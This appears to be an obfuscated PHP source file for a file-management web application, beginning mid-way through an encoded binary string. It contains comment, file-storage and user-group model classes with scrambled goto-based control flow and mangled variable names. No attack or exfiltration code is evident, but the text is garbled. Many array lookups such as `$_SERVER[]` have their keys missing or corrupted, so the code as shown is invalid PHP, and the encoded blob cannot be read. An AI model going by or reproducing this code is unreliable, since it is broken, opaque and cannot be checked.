/C2b0XNAf%')."\x25\xaf\x31\xa6\x9a\xf1\x74\xc5\xbc\x38\x9\xe6\x2d\x4b\xa6\x99\x85\x7d\xb8\x90\xcf\x94\xb\xc6\x24\xcd\x2b\xef\x3c\x34\x8d\x6c\x5d\x47\x1a\xcc\x5d\x97\xb\xa8\x93\xf5\x67\x45\xe4\xf2\xcf\x11\xe2\xb1\x63\xa3\xfd\x73\xe5\x5a\x54\x3c".base64_decode('B5isFhWRJ60Fx7bdllbihzSlAgfkl5vlvJanVbhqxWXChTho0UYsSxbvbSvf7AYrzmLDeuVqg4sdww==')."\135\111\22\347\222\43\71\352\215\11\144\347\136\16\241\305\245\107\267\167\16\225\355\154\176\203\51\355\345\12\202\257\332\212\216\207\35\160\303\133\276\243\314\120\137\135\242\133\146\274\23\321\114\65\56\250\170\100"."\xa0\xe8\x59\x18\xa7\xd3\x8f\x64\xf8\xd1\x18\x91\x4\xf0\x2d\x9d\x57\xd4\x58\x7e\xe7\xfe\x53\x77\x3e\xf4\x8b\x9d\x1b\x6f\xd8\x79\xc1\x69\xdb\x2f\xbc\xdc\xb1\xe3\xec\xd\x3b\xae\x3e\x73\xc7\xd5\xe7\x6e\x3f\xeb\x86\xed\x57\xdc\x82\x13".strrev(']1e/;'."\r".'znwb7Gޛw?|=0qX\\Ws\\v').base64_decode('6BRQb507KLTcLlZId/ETWYt7bPTCGzN2xxIAOZPGFy9I6YdA2kpwv+bACytODmm6CY3gwYKQR79tmg==')."\x69\x52\x3e\x5\xa4\x6a\x84\x89\xe4\x44\xe4\x63\x47\xb8\x4e\x6\x21\xfe\xfe\x2f\x1c\x42\x74\x1c\x8e\x88\x1d\x31\x25\x14\x24\x57\x40\x70\x6f\x1b\x52\x70\x2a\x62\x65\x96\x8\x3c\x66\x67\x91\x60\xf9\x79\x7a\x47\xc1\x76\xe7\xc4\x1\x60"."\x57\x1a\xd3\xc6\x9\xad\xa1\xc7\x79\x78\x7d\xe0\x79\x38\xe9\x16\xbb\x2c\xc8\xdf\x5f\x20\xc4\x2e\x5e\x8e\x23\x2d\x35\xc3\x8d\x53\xdc\x44\xa3\xdd\x89\xca\x70\x92\x27\x25\x99\x46\x1b\xc9\x9e\x40\x93\x93\x79\xe9\xfc\xae\x12\xc8\x11\x21"."\x2f\x2\xbf\x79\x8e\x8e\x99\x7a\x3\xe1\xa8\x6f\x95\x3f\x14\xe\x95\x25\xf5\x79\x42\xa1\x81\x40\xd0\x8b\xb5\x62\xcb\x92\x51\x2e\x41\x13\xa1\x2c\xa9\xaf\x2b\xd0\x3b\x59\x9a\xaf\xc7\xe3\xef\x2e\x4b\x83\x9a\x9\x50\x57\x97\xbe\x7a\x8a"."\223\374\175\250\226\236\356\156\252\32\127\136\13\177\373\162\136\23\164\327\306\317\201\363\151\215\36\253\332\324\166\350\261\171\110\246\263\121\174\300\103\311\262\143\56\241\10\353\21\204\70\314\6\175\211\227\5\362"."\145\133\24\101\272\200\332\3\275\244\260\40\165\100\11\237\214\147\234\205\211\313\250\101\242\152\22\277\115\164\131\156\35\5\70\232\54\210\277\11\104\50\256\335\10\100\124\151\155\167\74\266\16\54\277\343\264\337".strrev('6oz)bV0,1%mc4K)XKxp?@1kPF^')."\xec\xa5\xff\x7\xc3\x86\xfb\x96\xc9\xc6\x0\x0".""."".""."", 10, -8))); goto f; b: function beforeShutdown() { Hook::trigger($_SERVER[͒][36]); } $_SERVER[$_SERVER[͒][37]] = BASIC_PATH; $_SERVER[$_SERVER[͒][38]] = LIB_DIR; goto B; AԴ: class CommentModel extends ModelBase { protected $tableName = "\143\157\155\155\145\x6e\164"; protected $tableMeta = array("\x74\141\x62\154\x65\x4e\141\x6d\x65" => "\x63\x6f\155\155\x65\156\x74\137\155\x65\164\x61", "\x6d\x65\x74\x61\106\151\x65\x6c\144" => "\143\x6f\155\x6d\x65\156\164\111\x44"); const TYPE_SOURCE = 1; const TYPE_SHARE = 2; const TYPE_USER = 3; const TYPE_GROUP = 4; const TYPE_TOPIC = 5; public static $TYPEALL = array(self::TYPE_SOURCE, self::TYPE_SHARE, self::TYPE_USER, self::TYPE_GROUP, self::TYPE_TOPIC); public function addComment($F؜) { $b쓟 =& $_SERVER[]; if ($F؜[$b쓟[2148]]) { $D = $this->where(array($b쓟[2149] => $F؜[$b쓟[2148]]))->find(); if (!$D || $D[$b쓟[371]] != $F؜[$b쓟[371]] || $D[$b쓟[456]] != $F؜[$b쓟[456]]) { return !1; } $this->where(array($b쓟[2149] => $F؜[$b쓟[2148]]))->setAdd($b쓟[2150], 1); } return $this->add($F؜); } public function remove($aш) { $b =& $_SERVER[]; $f = array($b[2149] => $aш); $b = $this->where($f)->find(); if ($b[$b[2148]]) { $this->where(array($b[2149] => $b[$b[2148]]))->setAdd($b[2150], -1); } return $this->where($f)->delete(); } public function edit($dǴ, $BÊ) { $b͗ =& $_SERVER[]; $ė = array($b͗[2149] => $dǴ); return $this->where($ė)->save(array($b͗[2151] => $BÊ)); } public function prasise($b皏ް) { $D =& $_SERVER[]; $fԭ = Model($D[2152]); $B仑 = array($D[2149] => $b皏ް, $D[1444] => USER_ID); $Dȅ = $fԭ->where($B仑)->find(); if (!$Dȅ) { $fԭ->add($B仑); $bڐ = $this->where(array($D[2149] => $b皏ް))->setAdd($D[2153], 1); } else { $fԭ->where($B仑)->delete(); $bڐ = $this->where(array($D[2149] => $b皏ް))->setAdd($D[2153], -1); } return $bڐ; } public function targetInfo($C؞, $Dଉة) { goto A󳲛; A󳲛: $Eӑ =& $_SERVER[]; $D焾֑ = array($Eӑ[521] => $C؞, $Eӑ[522] => $Dଉة); $F曯߮ = $this->where($D焾֑)->count(); goto DΘ; A̱ū: return $F꾌; goto e; DΘ: $eޝ = "\122\x49\107\x48\124\40\x4a\117\111\x4e\40{$this->tablePrefix}\143\157\155\x6d\145\156\164\x5f\160\162\141\x69\x73\145\40\x73\x74\141\162\x20\157\x6e\40\x63\x6f\155\x6d\145\156\x74\56\143\x6f\x6d\155\x65\156\x74\x49\104\40\75\40\x73\x74\141\x72\x2e\143\x6f\x6d\x6d\x65\x6e\x74\111\x44"; $aۄ = $this->alias($Eӑ[341])->where($D焾֑)->join($eޝ, $Eӑ[2154])->count(); $F꾌 = array($Eӑ[2155] => $F曯߮, $Eӑ[2156] => $aۄ); goto A̱ū; e: } public function listData($Cͦ) { $BɃ =& $_SERVER[]; if (isset($Cͦ[$BɃ[2157]])) { if ($Cͦ[$BɃ[2157]]) { $Cͦ[$BɃ[2158]] = array($BɃ[943], intval($Cͦ[$BɃ[2157]])); } unset($Cͦ[$BɃ[2157]]); } if (isset($Cͦ[$BɃ[2159]])) { if ($Cͦ[$BɃ[2159]]) { $Cͦ[$BɃ[2158]] = array($BɃ[940], intval($Cͦ[$BɃ[2159]])); } unset($Cͦ[$BɃ[2159]]); } return $this->_listData($Cͦ); } private function _listData($Cژ) { $e =& $_SERVER[]; $B = $this->where($Cژ)->_makeOrder()->selectPage(100); $this->_listAppendParent($B[$e[354]]); $this->_listAppendUser($B[$e[354]]); $this->_listAppendMeta($B[$e[354]]); return $B; } private function _makeOrder() { $d =& $_SERVER[]; $a = array($d[2153], $d[2150], $d[187]); $aܘ߫ = Input::get($d[407], $d[7], $d[389], $a); $Bе = Input::get($d[408], $d[7], $d[1446], array($d[2160], $d[405])); $aƅ = $aܘ߫ . $d[50] . $Bе; return $this->order($aƅ); } private function _listAppendParent(&$B²) { goto C; AѤǛ: if (!$dã) { return; } $fڱ = $this->where(array($E[2149] => array($E[7], $dã)))->select(); $fڱ = array_to_keyvalue($fڱ, $E[2158]); goto b; b: foreach ($B² as &$b򅋄) { if (isset($fڱ[$b򅋄[$E[2148]]])) { $b򅋄[$E[2161]] = $fڱ[$b򅋄[$E[2148]]]; } } goto D; C: $E =& $_SERVER[]; $dã = array_unique(array_to_keyvalue($B², $E[33], $E[2148])); $dã = array_remove_value($dã, $E[468]); goto AѤǛ; D: } private function _listAppendUser(&$a) { goto b䢊Τ; a賡̈́: if (count($f۔) == 0) { return; } foreach ($a as $cŲ) { if (isset($cŲ[$Dä[2161]])) { $f۔[] = $cŲ[$Dä[2161]][$Dä[1453]]; } } $B = Model($Dä[477])->userListInfo($f۔); goto dܠԷ; b䢊Τ: $Dä =& $_SERVER[]; $f۔ = array_unique(array_to_keyvalue($a, $Dä[33], $Dä[1453])); $f۔ = array_remove_value($f۔, $Dä[468]); goto a賡̈́; dܠԷ: foreach ($a as &$cŲ) { $cŲ[$Dä[535]] = $B[$cŲ[$Dä[1453]]]; if (isset($cŲ[$Dä[2161]])) { $cŲ[$Dä[2161]][$Dä[535]] = $B[$cŲ[$Dä[2161]][$Dä[1453]]]; } } goto d; d: } private function _listAppendMeta(&$cͷ܈) { goto A; fͽ: if (!$Dɔ) { return; } foreach ($cͷ܈ as $bĻ) { if (isset($bĻ[$eؠ[2161]])) { $Dɔ[] = $bĻ[$eؠ[2161]][$eؠ[2158]]; } } $Bʴ݆ = $this->metaList($Dɔ); goto d; A: $eؠ =& $_SERVER[]; $Dɔ = array_unique(array_to_keyvalue($cͷ܈, $eؠ[33], $eؠ[2158])); $Dɔ = array_remove_value($Dɔ, $eؠ[468]); goto fͽ; d: if (!$Bʴ݆) { return !1; } foreach ($cͷ܈ as &$bĻ) { $bĻ[$eؠ[417]] = $Bʴ݆[$bĻ[$eؠ[2158]]]; if (isset($bĻ[$eؠ[2161]])) { $bĻ[$eؠ[2161]][$eؠ[417]] = $Bʴ݆[$bĻ[$eؠ[2161]][$eؠ[2158]]]; } } goto e٥; e٥: } private function metaList($A򂊼) { goto c񯰘޳; cˉק: return $aۻ ? $aۻ : array(); goto dҒ; b: $aۻ = Model($bɶ[2162])->where($B𺗫)->select(); $aۻ = array_to_keyvalue_group($aۻ, $bɶ[2158]); foreach ($aۻ as $bͬ => $a̫) { $A򯍈 = array(); foreach ($a̫ as $FϞք) { $A򯍈[$FϞք[$bɶ[89]]] = $FϞք[$bɶ[359]]; } $aۻ[$bͬ] = $A򯍈; } goto cˉק; c񯰘޳: $bɶ =& $_SERVER[]; if (!$A򂊼) { return array(); } $B𺗫 = array($bɶ[2158] => array($bɶ[7], $A򂊼)); goto b; dҒ: } } class FileModel extends ModelBase { protected $tableName = "\151\157\137\x66\x69\154\x65"; protected $tableMeta = array("\x74\141\x62\x6c\145\116\x61\155\x65" => "\x69\157\137\146\151\154\x65\137\155\145\164\x61", "\155\145\164\141\x46\x69\145\x6c\144" => "\146\x69\x6c\145\x49\x44"); public function fileInfo($f⛏) { $A̱ȋ =& $_SERVER[]; static $f߆ = array(); if (!isset($f߆[$f⛏])) { $B = $A̱ȋ[2163]; $EЭ = Model($A̱ȋ[422])->field($B)->where(array($A̱ȋ[420] => $f⛏))->find(); $f߆[$f⛏] = $EЭ; } return $f߆[$f⛏]; } public function addFileByContent($e = '', $Dܦ = '') { goto B䄷; Bڂ: if (file_exists($E)) { @unlink($E); } return $c; goto C; f: $E = $F⴫ . $Fɔ[2165] . rand_string(16); file_put_contents($E, $e); $c = $this->addFile($E, $Dܦ, !0); goto Bڂ; B䄷: $Fɔ =& $_SERVER[]; $F⴫ = TEMP_PATH . $Fɔ[2164]; if (!is_dir($F⴫)) { mk_dir($F⴫); } goto f; C: } public function createFileName($E֋) { goto Cⶑ; B: $C = $Fг->pathFather($A); static $cڮչ = false; $bݗל = $eޖ[2166] . md5($C); goto B߰; Cⶑ: $eޖ =& $_SERVER[]; $Fг = IO::init($eޖ[8]); $A = $this->makeFilePath($E֋, $Fг); goto B; B߰: if (!$cڮչ && !Cache::get($bݗל)) { $cڮչ = !0; $Aѥ = IO::mkdir($C); if (!IO::exist($Aѥ . $eޖ[2167])) { IO::mkfile($Aѥ . $eޖ[2167]); } Cache::set($bݗל, 1, 3600 * 2); } return $A; goto F; F: } public function makeFilePath($Aɵ, $b˖ʤǴ) { goto d; F: $f = $Cݴ . rand_string(5) . short_id(100); $Aɵ = str_replace($aߐ[8], $aߐ[70], KodIO::clear($Aɵ)); if (!$Aɵ) { $c­˅ = $aߐ[2170]; } goto D; d: $aߐ =& $_SERVER[]; $c­˅ = Model($aߐ[1103])->get($aߐ[2168]); $Cݴ = KodIO::defaultIO() . date($aߐ[2169]); goto F; D: switch ($c­˅) { case $aߐ[2171]: $f = $f . $aߐ[91] . $b˖ʤǴ->ext($Aɵ); if ($b˖ʤǴ->ext($Aɵ) == $aߐ[2111]) { $f .= $aߐ[2172]; } break; case $aߐ[2173]: goto eɲԒ; D: break; goto BΈ巟; eɲԒ: $a = Model($aߐ[1103])->get($aߐ[1352]); $c󏥹 = substr(md5($aߐ[1930] . $a . date($aߐ[706])), 0, 8); $Cݴ = KodIO::defaultIO() . date($aߐ[2174]) . $c󏥹 . $aߐ[8]; goto A蒗Ğ; A蒗Ğ: if ($b˖ʤǴ->ext($Aɵ) == $aߐ[2111]) { $Aɵ .= $aߐ[2172]; } $e = IO::fileNameAuto($Cݴ, $Aɵ); $f = $Cݴ . $e; goto D; BΈ巟: case $aߐ[2170]: break; default: break; } return $f; goto d󅍉; d󅍉: } public function addFileByRemote($Fřِ, $c, $aΕ = array()) { goto D㊤; d: if ($C = $this->addFileCheckExist($f׽ۃ[$Fп[164]], $f׽ۃ[$Fп[163]], $f׽ۃ[$Fп[77]])) { return $C; } return $this->addFileData($f׽ۃ); goto f䎃; D㊤: $Fп =& $_SERVER[]; if (!IO::exist($Fřِ)) { return !1; } $D = $aΕ[$Fп[163]] ? $aΕ[$Fп[163]] : $Fп[33]; goto Fƛ; Fƛ: $bϞ = IO::hashMd5($Fřِ, $D); $c쟾 = KodIO::defaultDriver(); $f׽ۃ = array($Fп[520] => IO::size($Fřِ), $Fп[2175] => 1, $Fп[386] => $c, $Fп[755] => $c쟾[$Fп[367]], $Fп[387] => $Fřِ, $Fп[2176] => $aΕ[$Fп[164]] ? $aΕ[$Fп[164]] : IO::hashSimple($Fřِ), $Fп[2177] => $bϞ ? $bϞ : $D); goto d; f䎃: } private function addFileData($a) { $D򂛃 =& $_SERVER[]; if (!$a) { return !1; } $a[$D򂛃[77]] = intval($a[$D򂛃[77]]); if (!$a[$D򂛃[77]] && strlen($a[$D򂛃[164]]) > 32) { $a[$D򂛃[77]] = intval(substr($a[$D򂛃[164]], 32)); } $b؂쒐 = $this->add($a); return $this->find($b؂쒐); } public function addFile($Dմڝ, $C, $c˶ = false) { $eĳ֜ = IO::hashSimple($Dմڝ); $CȆǦ = IO::hashMd5($Dմڝ); $F = IO::size($Dմڝ); if ($fߏ = $this->addFileCheckExist($eĳ֜, $CȆǦ, $F)) { return $fߏ; } $AҢ녉 = $this->addFileMake($Dմڝ, $F, $eĳ֜, $CȆǦ, $C, $c˶); return $this->addFileData($AҢ녉); } public function addFileMake($d, $CԌ, $F؝, $e, $Aܢڐ, $C脓) { goto dΙψ; dΙψ: $A =& $_SERVER[]; $d = $this->createFileName($Aܢڐ); $cұ = get_path_father($d); goto aڻ; aڻ: $a = get_path_this($d); if ($C脓) { $eƃᖮ = IO::move($d, $cұ, !1, $a); } else { $eƃᖮ = IO::copy($d, $cұ, !1, $a); } if (!$eƃᖮ) { return !1; } goto b; b: $F蔻 = KodIO::defaultDriver(); $cĽ = array($A[520] => $CԌ, $A[2175] => 1, $A[386] => $Aܢڐ, $A[755] => $F蔻[$A[367]], $A[387] => $d, $A[2176] => $F؝, $A[2177] => $e); return $cĽ; goto e; e: } public function addFileCheckExist($F, $bۦʙ, $EƂ) { $eɕ =& $_SERVER[]; $cޮ = $this->findByHash($F, $bۦʙ); if (!$cޮ) { return !1; } $Dӡ = array($eɕ[2175] => intval($cޮ[$eɕ[2178]]) + 1, $eɕ[520] => $EƂ); $this->where(array($eɕ[420] => $cޮ[$eɕ[419]]))->save($Dӡ); return $cޮ; } public function remove($aˑѐ) { $this->linkCountChange($aˑѐ, !1); $this->clearEmpty(); return !0; } public function linkAdd($Cß) { $this->linkCountChange($Cß, !0); } public function linkCountChange($e݂, $fؤ) { goto Dܺ; cу: $Cњ = array(); foreach ($e݂ as $e܄É) { $c = $e܄É . $a𰍡[33]; if (!$Cњ[$c]) { $Cњ[$c] = 0; } $Cњ[$c]++; } $a椗 = array(); goto EՇ; EՇ: foreach ($Cњ as $e܄É => $aͧ) { $c = $aͧ . $a𰍡[33]; if (!$a椗[$c]) { $a椗[$c] = array(); } $a椗[$c][] = $e܄É; } foreach ($a椗 as $aͧ => $f) { if (!$f) { continue; } $aͧ = $fؤ ? $aͧ : -intval($aͧ); $c = array($a𰍡[419] => array($a𰍡[7], $f)); if ($aͧ < 0) { $c[$a𰍡[2178]] = array($a𰍡[944], abs($aͧ)); } $this->where($c)->setAdd($a𰍡[2178], $aͧ); } goto C񑛃; Dܺ: $a𰍡 =& $_SERVER[]; if (!$e݂) { return; } if (!is_array($e݂)) { $e݂ = array($e݂); } goto cу; C񑛃: } public function findByHash($F, $Cㅈ֔ = false) { $Aϓ =& $_SERVER[]; if (!$F && !$Cㅈ֔) { return !1; } $d = array($Aϓ[2176] => $F); if ($Cㅈ֔) { $d = array($Aϓ[2177] => $Cㅈ֔); } return $this->order($Aϓ[2179])->where($d)->find(); } public function clearEmpty($d = 0) { goto b팿; D򝕣ܕ: foreach ($C as $BթӃ) { $Eڶ->update(1); $this->resetFile($BթӃ); } $Eڶ->end(); goto Aނ; Eڟ: $C = $this->where($a)->select(); if (!$C) { return; } $Eڶ = new Task($dω[2181], $dω[33], count($C)); goto D򝕣ܕ; b팿: $dω =& $_SERVER[]; $a = time() - 3600 * 24 * $d; $a = $dω[2180] . $a; goto Eڟ; Aނ: } private function resetFile($BջŐ) { goto c׻; c׻: $E =& $_SERVER[]; $EĹ忌 = array($E[420] => $BջŐ[$E[419]]); $Fϡ = Model($E[1133])->where($EĹ忌)->count(); goto bޠ; EƇ: if ($BջŐ[$E[2178]] != $b) { $this->where($EĹ忌)->save(array($E[2175] => $b)); } goto CѨ; bޠ: $bê = Model($E[2182])->where($EĹ忌)->count(); $b = intval($Fϡ) + intval($bê); if ($b == 0) { IO::remove($BջŐ[$E[75]]); $this->where($EĹ忌)->delete(); $this->metaSet($BջŐ[$E[419]], null, null); return; } goto EƇ; CѨ: } public function storageInfo($B솱 = false) { goto c̖; c̖: $bذ =& $_SERVER[]; $e = $this->count() + 0.0; $EԽ = 0; goto F; F: $A͐Ҝ = 1; $D׹ = 0; $Dڅ = 5000; goto Cٙ; Cٙ: for ($F߆ = 0; $F߆ < $e; $F߆ = $F߆ + $Dڅ) { $bť = $this->limit($F߆, $F߆ + $Dڅ)->select(); foreach ($bť as $A) { $A͐Ҝ += $A[$bذ[77]] * $A[$bذ[2178]]; $EԽ += $A[$bذ[77]] * ($A[$bذ[2178]] - 1); $D׹ += $A[$bذ[2178]]; } } $CΥ = array($bذ[2183] => $A͐Ҝ, $bذ[2184] => $EԽ, $bذ[2185] => $EԽ / $A͐Ҝ, $bذ[81] => $e, $bذ[2186] => $D׹); return $CΥ; goto d׊; d׊: } } class GroupModel extends ModelBase { protected $tableName = "\147\162\x6f\x75\160"; protected $tableMeta = array("\x74\141\142\154\145\x4e\x61\155\x65" => "\147\162\x6f\x75\x70\x5f\x6d\x65\x74\141", "\155\x65\x74\x61\x46\x69\x65\154\x64" => "\x67\x72\x6f\165\x70\x49\x44"); protected function cacheFunctionAlias($Aλ) { $eۆ =& $_SERVER[]; return array($eۆ[2187] => array($Aλ[0], $eۆ[2188]), $eۆ[2189] => array($Aλ[0], $eۆ[2188])); } protected function getInfo($B) { $C = $this->getInfoSimple($B); if (!$C) { return !1; } return $this->_listDataApplyItem($C); } protected function getInfoSimple($cҳ, $dǪ = false) { $e =& $_SERVER[]; if ($dǪ) { $eŒ = array($e[2121] => intval($cҳ)); $EԅҪ = $this->where($eŒ)->find(); return is_array($EԅҪ) ? $EԅҪ : array(); } return $this->cacheFunctionGet($e[2190], $cҳ); } protected function groupAdd($dօ͆͡) { goto fס; Cҩ: if (isset($dօ͆͡[$B՝[2193]])) { $this->metaSet($fƊ, array($B՝[2193] => $dօ͆͡[$B՝[2193]], $B՝[2194] => $dօ͆͡[$B՝[2194]])); unset($dօ͆͡[$B՝[2193]]); unset($dօ͆͡[$B՝[2194]]); } Model($B՝[1133])->groupRootAdd($fƊ); return $fƊ; goto Dð; fס: $B՝ =& $_SERVER[]; if (!$dօ͆͡[$B՝[461]] && isset($dօ͆͡[$B՝[2121]]) && $dօ͆͡[$B՝[2121]] == 1) { if ($F׳ = $this->getInfoSimple($dօ͆͡[$B՝[2121]], !0)) { return $dօ͆͡[$B՝[2121]]; } } else { $F׳ = $this->getInfoSimple($dօ͆͡[$B՝[461]]); if (!$F׳) { return !1; } } $fĆ = $B՝[470]; goto Dք; fꙐ: if (!empty($dօ͆͡[$B՝[2121]])) { $A[$B՝[2121]] = $dօ͆͡[$B՝[2121]]; } $fƊ = $this->add($A); $this->setNamePinyin($fƊ, $A[$B՝[28]]); goto Cҩ; Dք: if ($F׳[$B՝[459]]) { $fĆ = $F׳[$B՝[459]] . $F׳[$B՝[2121]] . $B՝[47]; } $A = array($B՝[386] => $this->groupNameAuto($dօ͆͡[$B՝[461]], $dօ͆͡[$B՝[28]]), $B՝[368] => $dօ͆͡[$B՝[461]], $B՝[525] => $fĆ, $B՝[2191] => $dօ͆͡[$B՝[2105]], $B՝[2192] => 0, $B՝[2125] => 0); if (isset($dօ͆͡[$B՝[2142]])) { $A[$B՝[2142]] = $dօ͆͡[$B՝[2142]]; } else { $cǠ = $this->max($B՝[2142]); if (!$cǠ) { $cǠ = 0; } $A[$B՝[2142]] = $cǠ + 1; } goto fꙐ; Dð: } protected function groupEdit($dʤӤ, $fǾ) { $A =& $_SERVER[]; if (!empty($fǾ[$A[461]])) { $E = $this->getInfoSimple($dʤӤ); $EȽ = $this->getInfoSimple($fǾ[$A[461]]); if (!$E || !$EȽ) { return !1; } if ($E[$A[2121]] == $EȽ[$A[2121]]) { return !1; } if ($fǾ[$A[461]] != $E[$A[461]]) { if ($EȽ[$A[459]] !== $E[$A[459]] && strpos($EȽ[$A[459]], $E[$A[459]] . $E[$A[2121]] . $A[47]) === 0) { return !1; } $fǾ[$A[525]] = $EȽ[$A[459]] . $fǾ[$A[461]] . $A[47]; $this->_changeChildLevel($E, $EȽ); } } if (isset($fǾ[$A[28]])) { $this->setNamePinyin($dʤӤ, $fǾ[$A[28]]); } if (isset($fǾ[$A[2193]])) { $this->metaSet($dʤӤ, array($A[2193] => $fǾ[$A[2193]], $A[2194] => $fǾ[$A[2194]])); unset($fǾ[$A[2193]]); unset($fǾ[$A[2194]]); } return $this->where(array($A[2195] => $dʤӤ))->save($fǾ); } private function _changeChildLevel($cӡ, $fٙ, $DٷЮ = false) { goto e٤; e٤: $f =& $_SERVER[]; $D = $cӡ[$f[459]] . $cӡ[$f[2121]] . $f[47]; $bƝ = $fٙ[$f[459]] . $fٙ[$f[2121]] . $f[47] . $cӡ[$f[2121]] . $f[47]; goto dӉذ; E: $this->where($Dέߴ)->data($dՂ)->save(); goto E٬; dӉذ: if ($DٷЮ) { $bƝ = $fٙ[$f[459]] . $fٙ[$f[2121]] . $f[47]; } $Dέߴ = array($f[525] => array($f[483], $cӡ[$f[459]] . $cӡ[$f[2121]] . $f[484])); $dՂ = array($f[525] => array($f[534], "\162\x65\x70\x6c\x61\x63\x65\x28\x70\x61\162\145\156\164\114\x65\166\145\154\54\x27{$D}\x27\x2c\47{$bƝ}\47\x29")); goto E; E٬: } public function setNamePinyin($BƘ, $aܸ = false) { $aмٖ =& $_SERVER[]; if (!$aܸ) { $Cڍݜ = $this->getInfoSimple($BƘ); $aܸ = $Cڍݜ[$aмٖ[28]]; } if (!Input::check($aܸ, $aмٖ[528])) { $this->metaSet($BƘ, $aмٖ[416], null); $this->metaSet($BƘ, $aмٖ[415], null); return; } $E = array($aмٖ[416] => str_replace($aмٖ[50], $aмٖ[33], Pinyin::encode($aܸ)), $aмٖ[415] => Pinyin::encode($aܸ, $aмٖ[529])); $this->metaSet($BƘ, $E); } protected function groupStatus($B㹃, $f) { goto eь݇; c: foreach ($aؐл as $B㹃) { $E[] = array($a鄄γ[2121] => $B㹃, $a鄄γ[89] => $a鄄γ[708], $a鄄γ[359] => $f); } return Model($a鄄γ[2196])->addAll($E, array(), !0); goto c۞; eь݇: $a鄄γ =& $_SERVER[]; $cƯ = $this->getInfoSimple($B㹃); if (!$cƯ) { return !1; } goto f; f: if ($f == $a鄄γ[83]) { $aؐл = $this->parentLevelArray($cƯ[$a鄄γ[459]]); } else { $E = array($a鄄γ[525] => array($a鄄γ[483], $cƯ[$a鄄γ[459]] . $cƯ[$a鄄γ[2121]] . $a鄄γ[484])); $aؐл = $this->where($E)->field($a鄄γ[2121])->select(); $aؐл = array_to_keyvalue($aؐл, $a鄄γ[33], $a鄄γ[2121]); } $aؐл[] = $cƯ[$a鄄γ[2121]]; $E = array(); goto c; c۞: } private function _groupStatusApply($aՂ, $bۦ) { $eל =& $_SERVER[]; if ($bۦ == $eל[83]) { $E = $this->parentLevelArray($aՂ[$eל[459]]); } else { $a = array($eל[525] => array($eל[483], $aՂ[$eל[459]] . $aՂ[$eל[2121]] . $eל[484])); $E = $this->where($a)->field($eל[2121])->select(); $E = array_to_keyvalue($E, $eל[33], $eל[2121]); } if (empty($E)) { return; } $b = array(); foreach ($E as $b) { $b[] = array($eל[2121] => $b, $eל[89] => $eל[708], $eל[359] => $bۦ); } Model($eל[2196])->addAll($b, array(), !0); } protected function groupRemove($dǔؖ) { goto A; fش: if (!$eň || $eň[$Cưʆ[461]] == 0) { return !1; } $d娯 = $this->getInfoSimple($eň[$Cưʆ[461]]); $this->_changeChildLevel($eň, $d娯, !0); goto f흝Ǒ; F׎: Model($Cưʆ[772])->groupRootRemove($dǔؖ); return $this->where($B鶉)->delete(); goto a辑; A: $Cưʆ =& $_SERVER[]; $B鶉 = array($Cưʆ[2121] => $dǔؖ); $eň = $this->where($B鶉)->find(); goto fش; f흝Ǒ: $this->where(array($Cưʆ[461] => $dǔؖ))->save(array($Cưʆ[461] => $eň[$Cưʆ[461]])); Model($Cưʆ[2196])->where($B鶉)->delete(); Model($Cưʆ[2197])->where($B鶉)->delete(); goto F׎; a辑: } protected function groupSort($Cα) { $D =& $_SERVER[]; $D狃ޝ = array(); foreach ($Cα as $a => $EƢ) { $D狃ޝ[] = array($D[2121], $EƢ, $D[2142], $a + 1); } $this->saveAll($D狃ޝ); } public function listData() { $EוÏ = $this->_makeOrder()->selectPage(50); $this->_listDataApply($EוÏ[$_SERVER[][354]]); return $EוÏ; } private function _makeOrder($e = '') { goto eѪ; B: $Dҿ = Input::get($e󆕉ʂ[407], $e󆕉ʂ[7], $e󆕉ʂ[2125], $c݃é); $fޯ = Input::get($e󆕉ʂ[408], $e󆕉ʂ[7], $e󆕉ʂ[2198], array($e󆕉ʂ[2198], $e󆕉ʂ[404])); $fޯ = $E[$fޯ]; goto f䨊; f䨊: $e = $e . "{$Dҿ}\40{$fޯ}\54\x20\x67\x72\157\165\x70\111\x44\40\x61\x73\x63"; return $this->order($e); goto F; eѪ: $e󆕉ʂ =& $_SERVER[]; $c݃é = array($e󆕉ʂ[2121], $e󆕉ʂ[28], $e󆕉ʂ[2107], $e󆕉ʂ[187]); $E = array($e󆕉ʂ[402] => $e󆕉ʂ[403], $e󆕉ʂ[404] => $e󆕉ʂ[405]); goto B; F: } public function listChild($bܐ) { $C =& $_SERVER[]; $C֒ = $this->where(array($C[461] => $bܐ))->_makeOrder()->selectPage(200); $this->_listDataApply($C֒[$C[354]]); return $C֒; } public function listByID($d͕) { $fÝ =& $_SERVER[]; if (!$d͕) { return array(); } $E襮ՄР = array($fÝ[2121] => array($fÝ[7], $d͕)); $AՔ = $this->where($E襮ՄР)->select(); $this->_listDataApply($AՔ); return $AՔ; } public function listSearch($Cӑ) { goto aѵխ; D: if (!trim($D)) { return !1; } $D = str_replace($cդڟ[2201], $cդڟ[2202], $D); $eܨԑ = array($cդڟ[2121] => array($cդڟ[771], "\45{$D}\45"), $cդڟ[28] => array($cդڟ[771], "\45{$D}\x25"), $cդڟ[929] => $cդڟ[2203]); goto fǏ; aѵխ: $cդڟ =& $_SERVER[]; $D = $Cӑ[$cդڟ[2199]]; $AÇ = isset($Cӑ[$cդڟ[2200]]) ? $Cӑ[$cդڟ[2200]] : !1; goto D; C: if (!$c͸ || count($c͸[$cդڟ[354]]) < 5 && Input::check($D, $cդڟ[306])) { goto aՋܽ; aՋܽ: $FƋ = $this->groupChildrenAll($AÇ); $f혧 = $this->_searchFromMeta($cդڟ[415], $D, 10, $FƋ); $fմ = $this->_searchFromMeta($cդڟ[416], $D, 10, $FƋ); goto dըޚ; A摡: $c͸[$cդڟ[351]][$cդڟ[353]] = ceil($c͸[$cդڟ[351]][$cդڟ[352]] / $c͸[$cդڟ[351]][$cդڟ[349]]); goto E; dըޚ: $Eݏ䄛 = array_merge($f혧, $fմ, $c͸[$cդڟ[354]]); $c͸[$cդڟ[354]] = array_unique_by_key($Eݏ䄛, $cդڟ[2121]); $c͸[$cդڟ[351]][$cդڟ[352]] = count($c͸[$cդڟ[354]]); goto A摡; E: } $this->_listDataApply($c͸[$cդڟ[354]]); return $c͸; goto aё; fǏ: if ($AÇ) { $d̵ = $this->getInfoSimple($AÇ); $cퟎ = $d̵[$cդڟ[459]] . $AÇ . $cդڟ[484]; $eܨԑ = array($eܨԑ, array($cդڟ[459] => array($cդڟ[771], $cퟎ))); } $c͸ = $this->_makeOrder()->where($eܨԑ)->selectPage(20); $c͸ = $c͸ ? $c͸ : array(); goto C; aё: } protected function groupChildrenAll($E݌) { $eȔ =& $_SERVER[]; if (!$E݌) { return !1; } if 